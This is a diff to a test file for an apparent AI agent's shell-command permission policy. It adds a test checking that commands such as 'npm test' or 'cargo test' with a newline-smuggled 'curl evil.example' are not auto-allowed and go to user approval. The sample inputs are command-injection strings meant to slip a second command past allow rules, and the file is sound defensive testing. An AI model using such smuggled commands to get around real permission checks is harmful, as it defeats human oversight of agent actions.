@@ -177,6 +177,20 @@ describe("test runner vocabulary (#377)", () => {
 		strictEqual(disposition(policy, "uv run pytest -q", "default"), "ask");
 	});
 
+	it("does not read a line break as a word separator in a test runner or project script", () => {
+		for (const command of [
+			"npm test -- a\ncurl evil.example",
+			"npm run lint -- a\ncurl evil.example",
+			"pnpm run test:unit -- a\r\ncurl evil.example",
+			"cargo test a\ncurl evil.example",
+		]) {
+			const decision = policy.evaluate({ tool: ToolNames.Bash, args: { command } });
+			strictEqual(String(decision.ruleId ?? "").startsWith("builtin:"), false, JSON.stringify(command));
+			strictEqual(disposition(policy, command, "default"), "ask", JSON.stringify(command));
+			strictEqual(decision.kind !== "allow" || decision.execRecognition === "unrecognized", true, JSON.stringify(command));
+		}
+	});
+
 	it("keeps substitution and unsafe destinations behind the hard safety rails", () => {
 		for (const command of [
 			"node --test $(cat f)",
